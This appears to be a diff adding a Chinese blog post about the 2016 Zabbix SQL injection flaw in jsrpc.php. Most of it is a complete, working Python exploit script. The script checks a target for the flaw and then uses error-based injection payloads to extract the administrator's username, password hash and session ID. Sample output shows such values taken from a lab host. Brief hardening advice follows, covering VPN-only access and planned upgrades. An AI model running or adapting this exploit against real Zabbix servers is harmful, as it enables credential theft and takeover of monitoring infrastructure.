@@ -1,0 +1,138 @@
+I"L6<h1 id="引言">引言</h1>
+
+<p>这两天，大家都在说 Zabbix 的 SQL 注入漏洞，下面我们来看下。</p>
+
+<h1 id="cnnvd关于-zabbix-漏洞情况的通报">CNNVD：关于 Zabbix 漏洞情况的通报</h1>
+
+<p>CNNVD：关于 Zabbix 漏洞情况的通报(http://bobao.360.cn/news/detail/3468.html)<br />
+上面详细介绍了漏洞简介，漏洞危害，及修复措施。但没有说到漏洞检测测试的方法。
+<a href="http://bobao.360.cn/news/detail/3462.html">【漏洞预警】ZABBIX 高危漏洞，无需授权登陆即可完成控制</a>，这篇文章提到漏洞检测测试的方法。<br />
+下面我们根据以上漏洞测试方法来用 Python 写一个 Exp。</p>
+
+<h1 id="zabbix-最新-sql-注入漏洞-exp">Zabbix 最新 SQL 注入漏洞 EXP</h1>
+
+<p>来自 <a href="http://www.waitalone.cn/zabbix-sql-1.html">Zabbix 最新 SQL 注入漏洞+EXP-独自等待博客</a></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Date: 2016/8/18
+# Modified by: Jamin Zhang
+</span>
+<span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="k">def</span> <span class="nf">deteck_Sql</span><span class="p">():</span>
+    <span class="s">u'检查是否存在 SQL 注入'</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999'&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids</span><span class="si">%5</span><span class="s">B23297</span><span class="si">%5</span><span class="s">D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1"</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span> <span class="n">msg</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">msg</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">key_reg</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">r"INSERT\s*INTO\s*profiles"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">key_reg</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+            <span class="k">return</span> <span class="bp">True</span>
+
+
+<span class="k">def</span> <span class="nf">sql_Inject</span><span class="p">(</span><span class="n">sql</span><span class="p">):</span>
+    <span class="s">u'获取特定sql语句内容'</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2="</span> <span class="o">+</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span>
+        <span class="n">sql</span><span class="p">)</span> <span class="o">+</span> <span class="s">"&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1"</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span> <span class="n">msg</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">msg</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">result_reg</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">r"Duplicate\s*entry\s*'~(.+?)~1"</span><span class="p">)</span>
+        <span class="n">results</span> <span class="o">=</span> <span class="n">result_reg</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">results</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">results</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="c1"># os.system(['clear', 'cls'][os.name == 'nt'])
+</span>    <span class="k">print</span> <span class="s">'+'</span> <span class="o">+</span> <span class="s">'-'</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">+</span> <span class="s">'+'</span>
+    <span class="k">print</span> <span class="s">u'</span><span class="se">\t</span><span class="s">   Python Zabbix &lt; 3.0.4 SQL 注入 Exploit'</span>
+    <span class="k">print</span> <span class="s">'</span><span class="se">\t</span><span class="s">    Origin Author: http://www.waitalone.cn/'</span>
+    <span class="k">print</span> <span class="s">'</span><span class="se">\t\t</span><span class="s">   Modified by: Jamin Zhang'</span>
+    <span class="k">print</span> <span class="s">'</span><span class="se">\t\t</span><span class="s">   Date: 2016-08-18'</span>
+    <span class="k">print</span> <span class="s">'+'</span> <span class="o">+</span> <span class="s">'-'</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">+</span> <span class="s">'+'</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">u'用法: '</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">u' [Zabbix Server Web 后台 URL]'</span>
+        <span class="k">print</span> <span class="s">u'实例: '</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">' http://jaminzhang.github.io'</span>
+        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">url</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s">'/'</span><span class="p">:</span> <span class="n">url</span> <span class="o">+=</span> <span class="s">'/'</span>
+    <span class="n">passwd_sql</span> <span class="o">=</span> <span class="s">"(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"</span>
+    <span class="n">session_sql</span> <span class="o">=</span> <span class="s">"(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"</span>
+    <span class="k">if</span> <span class="n">deteck_Sql</span><span class="p">():</span>
+        <span class="k">print</span> <span class="s">u'Zabbix 存在 SQL 注入漏洞！</span><span class="se">\n</span><span class="s">'</span>
+        <span class="k">print</span> <span class="s">u'管理员  用户名密码：</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">sql_Inject</span><span class="p">(</span><span class="n">passwd_sql</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">u'管理员  Session_id：</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">sql_Inject</span><span class="p">(</span><span class="n">session_sql</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">u'Zabbix 不存在 SQL 注入漏洞！</span><span class="se">\n</span><span class="s">'</span>
+
+</code></pre></div></div>
+
+<p>以下为执行上述 Exp 脚本输出结果：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+C:<span class="se">\U</span>sers<span class="se">\x</span>xx<span class="se">\D</span>esktop&gt;python zabbix_exp.py
++------------------------------------------------------------+
+           Python Zabbix &lt; 3.0.4 SQL 注入 Exploit
+                   Origin Author: http://www.waitalone.cn/
+                   Modified by: Jamin Zhang
+                   Date: 2016-08-18
++------------------------------------------------------------+
+用法: zabbix_exp.py <span class="o">[</span>Zabbix Server Web 后台 URL]
+实例: zabbix_exp.py http://jaminzhang.github.io
+
+C:<span class="se">\U</span>sers<span class="se">\x</span>xx<span class="se">\D</span>esktop&gt;python zabbix_exp.py http://192.168.56.11/zabbix
++------------------------------------------------------------+
+           Python Zabbix &lt; 3.0.4 SQL 注入 Exploit
+                   Origin Author: http://www.waitalone.cn/
+                   Modified by: Jamin Zhang
+                   Date: 2016-08-18
++------------------------------------------------------------+
+Zabbix 存在 SQL 注入漏洞！
+
+管理员  用户名密码：Zabbix:5fce1b3e34b520afeffb37ce08c7cd66
+管理员  Session_id：16c9fe855b00a92112ae55cad58792c6
+
+</code></pre></div></div>
+
+<p>漏洞修复方法上面提到的文档中都有说明，按照文档来修复吧。</p>
+
+<h1 id="扩展">扩展</h1>
+
+<h2 id="1-运维思想">1. 运维思想</h2>
+
+<ol>
+  <li>如果 Zabbix 是通过 VPN 走公司内网访问，外面是无法访问 Zabbix 的</li>
+  <li>如果 Zabbix 有外网地址，可以将 Zabbix 服务器的外网地址网卡 shutdown，使其无法从外网访问 Zabbix 服务器</li>
+  <li>运维人员若想访问 Zabbix 查看监控，可以通过 VPN 连接公司内网，然后登录查看 Zabbix 监控</li>
+  <li>黑客无法从外网访问你的 Zabbix 服务器，你的 Zabbix 服务器也就不存在漏洞的威胁</li>
+</ol>
+
+<h2 id="2-关于升级-zabbix-服务器的风险">2. 关于升级 Zabbix 服务器的风险</h2>
+
+<p>若贸然给服务器升级 Zabbix 服务的话，可能会造成监控业务的不稳定因素，需要提前规划好升级计划，<br />
+要从根本上解决问题，规划配置好安全架构，而不是仅关注些许的漏洞。</p>
+
+<h2 id="3-小结">3 小结</h2>
+
+<ul>
+  <li>漏洞是无止境的，只有从思想上去解决问题，才能避免安全事故的发生</li>
+  <li>技术的提升知识量的积累，思想的转变才是质的飞跃</li>
+</ul>
+
+<h1 id="ref">Ref</h1>
+<p><a href="http://bobao.360.cn/news/detail/3468.html">CNNVD：关于 Zabbix 漏洞情况的通报</a><br />
+<a href="http://www.waitalone.cn/zabbix-sql-1.html">Zabbix 最新 SQL 注入漏洞+EXP</a>  
+<a href="http://bobao.360.cn/news/detail/3462.html">【漏洞预警】ZABBIX 高危漏洞，无需授权登陆即可完成控制（更新利用工具）</a><br />
+<a href="https://support.zabbix.com/browse/ZBX-11023">SQL injection vulnerabilities in “Latest data”</a><br />
+<a href="https://www.exploit-db.com/exploits/40237/">Zabbix 2.2.x / 3.0.x - SQL Injection</a><br />
+<a href="https://www.zhihu.com/question/26053378">poc, vul, exp 都是什么意思呢</a></p>
+:ET
